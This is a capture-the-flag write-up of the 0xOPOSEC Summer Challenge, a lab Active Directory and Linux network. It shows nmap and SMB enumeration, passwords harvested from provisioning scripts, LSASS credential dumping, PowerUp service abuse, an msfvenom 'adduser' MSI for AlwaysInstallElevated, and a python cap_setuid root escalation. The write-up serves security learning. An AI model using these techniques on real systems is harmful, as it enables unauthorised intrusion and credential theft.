"Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group."


## First recon

### Larapios Group Access


*"Larapios Group states that they access to our core infrastructure!
They claim that our security is lacking and have credentials to access our systems.
Quickly, grab the access and gain access to one of the internal machines!"*

<br>

- First thing I did was to find all the up hosts and then find more info about those and for that I used nmap

```bash
$ nmap -sn 192.168.111.0/24

Nmap scan report for 192.168.111.26
Nmap scan report for 192.168.111.30
Nmap scan report for 192.168.111.31
Nmap scan report for 192.168.111.34
Nmap scan report for 192.168.111.36
Nmap scan report for 192.168.111.41
Nmap scan report for 192.168.111.42

$  nmap -O 192.168.111.0/24

```

- Since this returned so much info I grouped everything by Windows and Linux machines by using the TTL when pinging and got the following

```bash
192.168.111.26:Windows
192.168.111.30:Windows
192.168.111.31:Linux
192.168.111.34:Linux
192.168.111.36:Windows
192.168.111.41:Windows
192.168.111.42:Windows
```

- Grabing the first machine (Windows) I wanted to enumerate more and since this is most likely using Windows AD why not enumerate for LDAP? After enumerating I got the respective domain `bajordas.local` and the DC

```bash
$ sudo nmap -n -sV --script "ldap* and not brute" 192.168.111.26
ldapServiceName: bajordas.local:win-dc01$@BAJORDAS.LOCAL
```

- Next thing I did was to enumerate all Windows machines for RDP since its a common service used by Windows and doing this got a lot more info like machine names and some juicy info

```
192.168.111.26
|   NetBIOS_Computer_Name: WIN-DC01
|   DNS_Computer_Name: WIN-DC01.bajordas.local

192.168.111.30
|   NetBIOS_Computer_Name: LAB-SHARE01
|   DNS_Computer_Name: LAB-SHARE01.bajordas.local

192.168.111.36
|   NetBIOS_Computer_Name: WIN-MGMT
|   DNS_Computer_Name: WIN-MGMT.bajordas.local

192.168.111.41
|   NetBIOS_Computer_Name: LAB-WIN6
|   DNS_Computer_Name: LAB-WIN6.bajordas.local

192.168.111.42
|   NetBIOS_Computer_Name: LAB-WIN7
|   DNS_Computer_Name: LAB-WIN7.bajordas.local
```

- Next, but still in the enumeration process I enumerated smb and found powershell scripts on `.30` machine

```bash
$ sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.111.30

users1.ps1
provisionUsers.ps1
```

- provisionUsers.ps1 had creds for sedalfino

```ps
net user sedalfino.freitas Summer2022 /add
```

- users1.ps1 was a golden mine with more user creds

```ps
#new joiners
net user rogerio.marques Summer2022 /add /domain
net user rute.rodrigues Summer2022 /add /domain
net user rita.munoiz Summer2022 /add /domain
net user renato.recesso Summer2022 /add /domain
net user carolina.azevedo Summer2022 /add /domain
net user casemiro.silva Summer2022 /add /domain
net user jose.borges Summer2022 /add /domain
net user stefan.silva Summer2022 /add /domain
net user mary.christmas Summer2022 /add /domain
net user rodgers.john Summer2022 /add /domain
```


- Knowing this I tried to authenticate anonymously on `.30` to check those shares

```bash
$ smbclient --no-pass -L //192.168.111.30/

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Admins$         Disk
	Backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk
	Users           Disk
```

- After this I tried to the creds I've found but only `sedalfino.freitas` were working but still I got the same privileges as anonymous

```bash
$ smbmap -u 'sedalfino.freitas' -p 'Summer2022' -d 'bajordas' -H 192.168.111.26
```

- After some minutes (hours?) I decided to use xfreerdp and connect to any machine and I was able to do that on `.41` but using remmina with `sedalfino.freitas:Summer2022` and `BAJORDAS.LOCAL` creds


```bash
flag{oneSmallFootInTheEnterprise}
```

<br>

## Second recon

### Spread Your Hacks

*"You got in? Noice!"*
*"I heard they got a special machine for "Important People", but they are not very security-focused and their automation is faulty. Can you access it?"*

<br>

- I already enumed a lot for the Windows machines so now I tried to jump to some Linux ones and used `enum4linux` for that

- enum4linux gave me some creds

```bash
$ enum4linux -u "sedalfino.freitas" -p "Summer2022" -U 192.168.111.26`

index: 0x109a RID: 0x454 acb: 0x00000210 Account: big.boss Name: big boss Desc: Password: Money$$$ , make all managers the same password so I have access
```

- Using `big.boss:Money$$$` I was able to rdp to `192.168.111.41` and `192.168.42`

- On `192.168.111.42` I've found the flag 


```bash
flag{slowMovingRabbit}
```

<br>


## First Windows Priv Esc

### Big Dollar Spender


*"You in? Nice! Can you pwn it? Maybe..."*

*"They installed some shady service and hammered things down to make it work. Maybe it can be exploited in your favour"*

<br>

- While doing enumeration and research on `192.168.111.42` i noticed a strange file

![image](https://user-images.githubusercontent.com/12052283/186279966-faba5a17-86f1-4f63-8963-247f750c18fc.png)

- winPEAS did a great job identifing the strange file permissions

![image](https://user-images.githubusercontent.com/12052283/186280079-4c18c89c-ef06-412b-9773-84af9b6abbff.png)

- After some hours of digging google and trying to understand how could I exploit this, I noticed that I could execute the file

- Everytime I tried executing the file I had an error

![image](https://user-images.githubusercontent.com/12052283/186280294-3cdf01b3-8e15-4300-92df-01b68d8120e2.png)

- Then I created a malicious .bat file that creates an user and gives permissions to that user but that didn't work either

- Next thing was to use [PowerUp](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/powerup)

- With PowerUp executed I noticed a couple stuff i could do like abusing the service `bajordas-svc` with PowerUp

![image](https://user-images.githubusercontent.com/12052283/186280695-ce41f69b-a109-4bdc-b58c-1c10be302f2c.png)

- Abused the `bajordas-svc` and got a new user with Admin privileges

![image](https://user-images.githubusercontent.com/12052283/186280851-bcfbd706-5081-4571-b07e-10dae5b5393b.png)

- To sign-in as this user I used rdp and got the flag inside `C:\Users\Administrator\Desktop`


```bash
flag{GameOn!}
```

<br>

## Third recon

### Other Os Are People 2

*"Larapios said there are some Linux machines loose in the environment and the System Administrator reuses their credentials 😩."*

*"Can you access them?"*

<br>


- I jumped to `192.168.111.41` to try to find creds because they could be helpful to the future

- First thing I did was to use [mimikatz](https://github.com/ParrotSec/mimikatz)

- For somereason I had touble using mimikatz to dump some creds, even with the latest version I wasn't lucky

![image](https://user-images.githubusercontent.com/12052283/186284584-2eff753a-cad1-42b0-a1e9-4d16a1d82d03.png)

- @darkcookie gave me an hint so I tried to [dump the LSASS](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf) and then use the minidump to get stored credentials

![image](https://user-images.githubusercontent.com/12052283/186284823-3f6bcb3d-6c7d-42f3-9e2b-226be1338436.png)

- After following the medium guide I got a creds for `bacano.do.it` and some other known accounts

![image](https://user-images.githubusercontent.com/12052283/186285244-3ec93fc5-5d87-44ea-b7b5-2c9b66f6ff59.png)

```

- Next thing I did was to login with ssh in `192.168.111.31` with `bacano.do.it` and I got the flag  

```bash
flag{pinguinsRPeople2}
```

- There was another challenge called `Shells, Shells, Shells` but I got the flag on this one too by using ssh in `192.168.111.34` with the same creds of `bacano.do.it`

```bash
flag{OneMore4TheRoad}
```


## First Linux Priv Esc

### CAPtain Pwn!

*"The System Administrator was having trouble getting scripts to run but found a way to always work!"*

*"Can you abuse the misconfiguration and pwn the machine?"*

<br>

- Now was time to privesc the Linux box `.31` so for that I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- The output of linpeas gave me a cool finding about [`/usr/bin/python3.8 = cap_setuid+ep`](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

![image](https://user-images.githubusercontent.com/12052283/186418732-aa6b5c4c-3941-498c-97c5-e087c5921d95.png)

- As the blog post stated *"As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task. This functionality mainly can be achieved by assigning privileges through sudo, or setuid permissions to an executable file which allows the user to adopt the role of the file owner. To accomplish the same task in a more secure way the system admin uses “capability” which plays an effective role in the security of Linux based operating systems."*

- Knowing this It's clear I can execute python (and that will have the setuid bit set) with root privileges, so It's trivial to spawn a shell as root

![image](https://user-images.githubusercontent.com/12052283/186419606-7ec2df45-5f8a-4b28-b471-6a4aed94f9ec.png)


```bash
flag{HelloCAPtain}
```

<br>


## Second Linux Priv Esc

### SO Cute!

*"Infrastructure logs show a weird behaviour on one binary left in the server but we couldn't discover how can we abuse it to render the server to its knees. Everything is patched so there will be a challenge."*

*"Can you analyze the server and look for ways to overcome its security?"*

- The description is straight forward that I need to dig into the logs

- So knowing this I started to search on linux logs (spent quite some time in this process)

- Navigating to `/usr/sbin` I found an interesting binary

![image](https://user-images.githubusercontent.com/12052283/186481520-196af136-c182-4d89-af6d-4cc50a97989b.png)

- I searched for this binary on google and I found nothing so I assume that this was a crafted binary to this challenge

- Running the binary gave me the following output

![image](https://user-images.githubusercontent.com/12052283/186482121-d0393300-bf8b-401b-89e8-2f9ccf777cd7.png)

- Unfortunately I was stuck for a long time on this challenge trying to break it without success so I wasn't able to get the flag



## Second Windows Priv Esc

### Stairway To Heaven

*"Larapios Group states that they can completely compromise the machine and gain Administrator access through a misconfiguration!"*

<br>

- So I moved to `192.168.111.41` and after some minutes of enumeration I decided to run [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

- winpeas returned an interesting finding, `alwaysinstalledelevated` was set to 1 so I could [exploit](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) this with a crafted `.msi` file

- I setuped a .msi file using `msfvenom -p windows/adduser USER=brun0 PASS=n0tSoSecure! -f msi -o alwe.msi` and then I uploaded that .msi file to `192.168.111.41`

- Then I executed the file from the windows box and then typed `net user` and found that `brun0` was a valid user

- Next I did a rdp connection with the new user created to the target machine and I was able to get the Administrator flag in `C:\Users\Administrator\Desktop` 

```bash
flag{wholeLegInTheEnterprise}
``` 

## Conclusion

This was my come back to 0XOPOSEC Summer Challenge (last I did was in 2019) and to be fair I realy liked It because It was more realistic as we could exploit linux machines and windows machines and jump from one to another.
A recommendation for the next one would be to have a more defined path because there was an handful of achines and the challenges asked for a flag but we had to find what machine should we exploit to get the flag to that specific challenge.
Other than that was a realy fun one so next is the Christmas challenge!
